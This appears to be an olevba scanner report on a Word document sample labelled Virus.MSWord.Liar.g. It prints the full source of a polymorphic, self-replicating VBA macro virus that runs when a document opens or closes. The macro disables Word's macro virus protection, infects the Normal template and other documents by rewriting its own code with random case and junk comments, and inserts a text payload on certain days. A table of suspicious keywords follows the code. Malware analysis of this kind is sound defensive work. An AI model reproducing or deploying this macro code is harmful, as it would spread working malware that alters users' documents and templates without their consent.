olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Liar.g
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Liar.g - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub document_open() '
Dim v(150): Options.VirusProtection = (Rnd * 0) '
SetAttr NormalTemplate.FullName, vbNormal '
Set a = MacroContainer.VBProject: Set ab = a.VBComponents(1) '
Set abc = ab.CodeModule: Set s = NormalTemplate: t = Chr(39) '
Set nh = s.VBProject.VBComponents(1).CodeModule '
For y = 1 To Int(75 - (Rnd * 20)): vx = vx & Chr(255 - Int(Rnd * 100)): Next y '
vc = "Private Sub document_close()" & t & vx & vbCr  '
If MacroContainer = NormalTemplate Then '
Set s = ActiveDocument: Set nh = s.VBProject.VBComponents(1).CodeModule '
vc = "Private Sub document_open()" & t & vx & vbCr '
End If: lin = abc.countoflines '
For i = 2 To lin '
jc = "": d = Int(Rnd * 3): p = InStr(abc.Lines(i, 1), t) '
If p = 0 Then GoTo e_ '
If p = 1 And lin > 100 Then '
d = 1: GoTo n_ '
End If '

> here the new thingy starts...

l = UCase(Left(abc.Lines(i, 1), (p - 1))) '
For o = 1 To Len(l) '
f = Mid(l, o, 1) '
If Asc(f) < 90 And Asc(f) > 65 Then f = Chr(Asc(f) + Int(Rnd * 2) * 32) '
v(i) = v(i) & f '

> this one is taken from 'selftextpolymorphism'. thanks a lot...

Next o '
For j = 1 To Int(75 - (Rnd * 20))  '
jc = jc & Chr(255 - Int(Rnd * 100)) '
Next j '
v(i) = v(i) & t & jc '
If d = 2 Then v(i) = v(i) & vbCr & t & jc '
vc = vc & v(i) & vbCr '
n_: '
Next i '
e_: '
If nh.countoflines < (1 + 1) Then '
nh.addfromstring vc: s.Save '
End If '
If Day(Now()) = (25 + Int(Rnd * 6)) Then Selection.InsertAfter "l0 julie, wassup?" '
End Sub '
Rem Class97Macro.julie - dedicated to julie ;) '
Rem Another virus by jack twoflower [LineZero & Metaphase] '

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |document_close      |Runs when the Word document is closed        |
|AutoExec  |document_open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

